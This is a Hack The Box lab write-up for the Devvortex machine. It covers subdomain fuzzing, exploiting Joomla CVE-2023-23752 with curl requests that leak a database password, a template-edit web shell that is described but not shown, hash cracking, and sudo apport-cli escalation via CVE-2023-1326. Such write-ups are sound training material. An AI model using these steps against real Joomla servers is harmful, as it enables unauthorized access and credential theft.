---
title: "HTB Machine Devvortex"
date: 2024-05-16T16:41:36+02:00
tags:
  - htb
  - ctf
  - linux
  - dev
  - vortex
  - joomla
  - CVE-2023-23752
---

# Devvortex - [HTB](https://www.hackthebox.com/machines/devvortex)
![alt text](images/banner.png)

## Recon

### Nmap Services

Port|Service
----|--------
80  |http (nginx/1.18.0)
22  |ssh ()

### Subdomains (VHost)
    $ ffuf -w ~/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://devvortex.htb -H "Host: FUZZ.devvortex.htb" -fs 154 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
    ________________________________________________

    :: Method           : GET
    :: URL              : http://devvortex.htb
    :: Wordlist         : FUZZ: /home/neptune/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
    :: Header           : Host: FUZZ.devvortex.htb
    :: Follow redirects : false
    :: Calibration      : false
    :: Timeout          : 10
    :: Threads          : 40
    :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
    :: Filter           : Response size: 154
    ________________________________________________

    dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 135ms]
    :: Progress: [26584/26584] :: Job [1/1] :: 336 req/sec :: Duration: [0:00:56] :: Errors: 1 ::

- **dev.devvortex.htb**

### HTTP Enumeration - dev.devvortex.htb
- **ffuf**    
        
      $ ffuf -w ~/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt:FUZZ -u http://dev.devvortex.htb/FUZZ                       

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
      ________________________________________________
      :: Method           : GET
      :: URL              : http://dev.devvortex.htb/FUZZ
      :: Wordlist         : FUZZ: /home/neptune/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
      :: Follow redirects : false
      :: Calibration      : false
      :: Timeout          : 10
      :: Threads          : 40
      :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
      ________________________________________________
      modules                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 75ms]
      templates               [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 68ms]
      tmp                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 69ms]
      media                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 69ms]
      cache                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 70ms]
      images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 70ms]
      plugins                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 71ms]
      includes                [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 71ms]
      language                [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 71ms]
      administrator           [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 91ms]
      libraries               [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 91ms]
      components              [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 75ms]
      api                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 89ms]
      home                    [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 423ms]
      layouts                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 106ms]
                              [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 1176ms]
      cli                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 149ms]
      :: Progress: [26584/26584] :: Job [1/1] :: 33 req/sec :: Duration: [0:12:53] :: Errors: 2 ::
 
- **robots.txt** - http://dev.devvortex.htb/robots.txt

      <---snipped--->
      User-agent: *
      Disallow: /administrator/
      Disallow: /api/
      Disallow: /bin/
      Disallow: /cache/
      Disallow: /cli/
      Disallow: /components/
      Disallow: /includes/
      Disallow: /installation/
      Disallow: /language/
      Disallow: /layouts/
      Disallow: /libraries/
      Disallow: /logs/
      Disallow: /modules/
      Disallow: /plugins/
      Disallow: /tmp/

- **README.txt**
                  
      Joomla! CMS™

      1- Overview
      	* This is a Joomla! 4.x installation/upgrade package.
      	* Joomla! Official site: https://www.joomla.org
      	* Joomla! 4.2 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_4.2_version_history
      	* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/4.2-dev

        <---snipped--->

- **Services Running**
  -  Joomla CMS 4.2
  
### Vulnerability Assessment - Joomla CMS 4.2

- **Vulnerability**: Joomla CMS 4.2 is vulnerable to Unauthenticated information disclosure (CVE-2023-23752) due to Improper access check in `Core` webservice endpoints. The affected versions are 4.0.0-4.2.7 in range. Due to flaws in Joomla’s access control to Web service endpoints, unauthenticated attackers access the RestAPI interface to obtain Joomla-related configuration information by constructing specially crafted requests, which eventually leads to the disclosure of sensitive information. For more on the vulnerability :
  - [NS Focus Global](https://nsfocusglobal.com/joomla-unauthorized-access-vulnerability-cve-2023-23752-notice/)
  - [Vuln Check](https://vulncheck.com/blog/joomla-for-rce)

- **PoC**: A publicly available exploit is published on [ExploitDB](https://www.exploit-db.com/exploits/51334). We can use this `{root_url}/api/index.php/v1/users?public=true` REST endpoint to obtain user information , and this `{root_url}/api/index.php/v1/config/application?public=true` endpoint for application configuration.


## Joomla CMS 4.2

### Exploiting CVE-2023-23752

- **User Information**:
  
      $ curl http://dev.devvortex.htb/api/v1/users?public=true
      
      {"links":{"self":"http:\/\/dev.devvortex.htb\/api\/v1\/users?public=true"},"data":[{"type":"users","id":"649","attributes":{"id":649,"name":"lewis","username":"lewis","email":"lewis@devvortex.htb","block":0,"sendEmail":1,"registerDate":"2023-09-25 16:44:24","lastvisitDate":"2024-04-26 10:37:12","lastResetTime":null,"resetCount":0,"group_count":1,"group_names":"Super Users"}},{"type":"users","id":"650","attributes":{"id":650,"name":"logan paul","username":"logan","email":"logan@devvortex.htb","block":0,"sendEmail":0,"registerDate":"2023-09-26 19:15:42","lastvisitDate":null,"lastResetTime":null,"resetCount":0,"group_count":1,"group_names":"Registered"}}],"meta":{"total-pages":1}}      

- **Application Config**:

      $ curl http://dev.devvortex.htb/api/index.php/v1/config/application?public=true 
      
      {"links":{"self":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true","next":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20","last":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"},"data":[{"type":"application","id":"224","attributes":{"offline":false,"id":224}},{"type":"application","id":"224","attributes":{"offline_message":"This site is down for maintenance.<br>Please check back again soon.","id":224}},{"type":"application","id":"224","attributes":{"display_offline_message":1,"id":224}},{"type":"application","id":"224","attributes":{"offline_image":"","id":224}},{"type":"application","id":"224","attributes":{"sitename":"Development","id":224}},{"type":"application","id":"224","attributes":{"editor":"tinymce","id":224}},{"type":"application","id":"224","attributes":{"captcha":"0","id":224}},{"type":"application","id":"224","attributes":{"list_limit":20,"id":224}},{"type":"application","id":"224","attributes":{"access":1,"id":224}},{"type":"application","id":"224","attributes":{"debug":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang_const":true,"id":224}},{"type":"application","id":"224","attributes":{"dbtype":"mysqli","id":224}},{"type":"application","id":"224","attributes":{"host":"localhost","id":224}},{"type":"application","id":"224","attributes":{"user":"lewis","id":224}},{"type":"application","id":"224","attributes":{"password":"P4ntherg0t1n5r3c0n##","id":224}},{"type":"application","id":"224","attributes":{"db":"joomla","id":224}},{"type":"application","id":"224","attributes":{"dbprefix":"sd4fg_","id":224}},{"type":"application","id":"224","attributes":{"dbencryption":0,"id":224}},{"type":"application","id":"224","attributes":{"dbsslverifyservercert":false,"id":224}}],"meta":{"total-pages":4}}
    
    We can see from the `meta` that it's only page 1 out of 4. We should gather all the data from this api using the `next` link and save it to a file.

### Users and Credentials
- **Users**:
  - lewis:
  
        {
            "id": 649,
            "name": "lewis",
            "username": "lewis",
            "email": "lewis@devvortex.htb",
            "block": 0,
            "sendEmail": 1,
            "registerDate": "2023-09-25 16:44:24",
            "lastvisitDate": "2024-04-26 10:37:12",
            "lastResetTime": null,
            "resetCount": 0,
            "group_count": 1,
            "group_names": "Super Users"
        }
  - logan:

        {
            "id": 650,
            "name": "logan paul",
            "username": "logan",
            "email": "logan@devvortex.htb",
            "block": 0,
            "sendEmail": 0,
            "registerDate": "2023-09-26 19:15:42",
            "lastvisitDate": null,
            "lastResetTime": null,
            "resetCount": 0,
            "group_count": 1,
            "group_names": "Registered"
        }

- **Credentials**:
  - lewis:

        {
            "type": "application",
            "id": "224",
            "attributes": {
                "user": "lewis",
                "id": 224
            }
        },
        {
            "type": "application",
            "id": "224",
            "attributes": {
                "password": "P4ntherg0t1n5r3c0n##",
                "id": 224
            }
        },
    We can try this creds to log into the admin dashboard of Joomla at `http://dev.devvortex.htb/administrator`.

### Admin Dashboard Enumeration
- PHP: 7.4.3 which is obsolete and no longer receives official security updates.
- MySQL: 8.0.35-0ubuntu0.20.04.1
- Server: Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64
- Disable PHP Functions:
  - pcntl_alarm
  - pcntl_fork
  - pcntl_waitpid
  - pcntl_wait
  - pcntl_wifexited
  - pcntl_wifstopped
  - pcntl_wifsignaled
  - pcntl_wifcontinued
  - pcntl_wexitstatus
  - pcntl_wtermsig
  - pcntl_wstopsig
  - pcntl_signal
  - pcntl_signal_get_handler
  - pcntl_signal_dispatch
  - pcntl_get_last_error
  - pcntl_strerror
  - pcntl_sigprocmask
  - pcntl_sigwaitinfo
  - pcntl_sigtimedwait
  - pcntl_exec
  - pcntl_getpriority
  - pcntl_setpriority
  - pcntl_async_signals
  - pcntl_unshare
- Phar: PHP Archive support is enabled. Can be used to bypass upload restriction for a shell.

### Getting Foothold
In the `System` menu Joomla offeres option to customize a template. I customized a template by modifying a existing php file. By inserting a shellcode I was successful getting a shell on the box as `www-data` user.


## Privilege Escalation

### Shell Stabilization
The shell was not stable at all. I couldn't see any interective output because I was missing an actual shell.

`www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin`

I was `www-data` and it's shell was assigned nologin. I did the following to make the shell stable.

    script /dev/null -c /bin/bash
    CTRL + Z
    stty raw -echo; fg
    Then press Enter twice, and then enter:
    export TERM=xterm

Then I had a good enough shell to work with.

### User Enumeration
After inspecting the `/etc/passwd` file I was sure that I had to escalate my privileges and take over `logan`  account. I could list the account's home directory and found the user flag but didn't have permission to read it.

### Service Enumeration
After inspecting for users I tried to access the MySQL database to find any credentials that can help me pivot to `logan`. So I logged in to the database service using the `lewis:P4ntherg0t1n5r3c0n##` and it worked.

### MySQL Enumeration
- **Databses**:
    
      show databases;
      +--------------------+
      | Database           |
      +--------------------+
      | information_schema |
      | joomla             |
      | performance_schema |
      +--------------------+

- **Tables**:

      +-------------------------------+
      | Tables_in_joomla              |
      +-------------------------------+
      | sd4fg_action_log_config       |
      | sd4fg_action_logs             |
      | sd4fg_action_logs_extensions  |
      | sd4fg_action_logs_users       |
      | sd4fg_assets                  |
      | sd4fg_associations            |
      | sd4fg_banner_clients          |
      | sd4fg_banner_tracks           |
      | sd4fg_banners                 |
      | sd4fg_categories              |
      | sd4fg_contact_details         |
      | sd4fg_content                 |
      | sd4fg_content_frontpage       |
      | sd4fg_content_rating          |
      | sd4fg_content_types           |
      | sd4fg_contentitem_tag_map     |
      | sd4fg_extensions              |
      | sd4fg_fields                  |
      | sd4fg_fields_categories       |
      | sd4fg_fields_groups           |
      | sd4fg_fields_values           |
      | sd4fg_finder_filters          |
      | sd4fg_finder_links            |
      | sd4fg_finder_links_terms      |
      | sd4fg_finder_logging          |
      | sd4fg_finder_taxonomy         |
      | sd4fg_finder_taxonomy_map     |
      | sd4fg_finder_terms            |
      | sd4fg_finder_terms_common     |
      | sd4fg_finder_tokens           |
      | sd4fg_finder_tokens_aggregate |
      | sd4fg_finder_types            |
      | sd4fg_history                 |
      | sd4fg_languages               |
      | sd4fg_mail_templates          |
      | sd4fg_menu                    |
      | sd4fg_menu_types              |
      | sd4fg_messages                |
      | sd4fg_messages_cfg            |
      | sd4fg_modules                 |
      | sd4fg_modules_menu            |
      | sd4fg_newsfeeds               |
      | sd4fg_overrider               |
      | sd4fg_postinstall_messages    |
      | sd4fg_privacy_consents        |
      | sd4fg_privacy_requests        |
      | sd4fg_redirect_links          |
      | sd4fg_scheduler_tasks         |
      | sd4fg_schemas                 |
      | sd4fg_session                 |
      | sd4fg_tags                    |
      | sd4fg_template_overrides      |
      | sd4fg_template_styles         |
      | sd4fg_ucm_base                |
      | sd4fg_ucm_content             |
      | sd4fg_update_sites            |
      | sd4fg_update_sites_extensions |
      | sd4fg_updates                 |
      | sd4fg_user_keys               |
      | sd4fg_user_mfa                |
      | sd4fg_user_notes              |
      | sd4fg_user_profiles           |
      | sd4fg_user_usergroup_map      |
      | sd4fg_usergroups              |
      | sd4fg_users                   |
      | sd4fg_viewlevels              |
      | sd4fg_webauthn_credentials    |
      | sd4fg_workflow_associations   |
      | sd4fg_workflow_stages         |
      | sd4fg_workflow_transitions    |
      | sd4fg_workflows               |
      +-------------------------------+

- Users:

       +----------+--------------------------------------------------------------+
       | username | password                                                     |
       +----------+--------------------------------------------------------------+
       | lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
       | logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
       +----------+--------------------------------------------------------------+

### Cracking the `logan` Hash
Using john the ripper I was able to crack the hash for logan.

`logan:tequieromucho`

Let's try this credential to log on. I could successfully log in using `ssh`.

### Root Privilege Escalation
After login into the `logan` account. I ran the command `sudo -l` with the above password. And I found following sudoers privileges for the account.

```
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

So `logan` can run `/usr/bin/apport-cli` with `sudo`. After, searching for apport-cli's know vulnerability I found a Privilege Escalation Vulnerability for apport-cli <= v2.26.0 dubbed `CVE-2023-1326`. The machine's `apport-cli` version is `2.20.11`. So it can be exploited if certain conditions are met. [For more on the PoC](https://github.com/diego-tella/CVE-2023-1326-PoC).

1. System should specially configured to allow unprivileged users to run sudo apport-cli.

2. `less` is configured as the pager.

3. The terminal size can be set.

Unfortunately all of the conditions were present in the box and we successfully gained `root` privilege following the steps described in PoC. Finally, acquired the root flag.

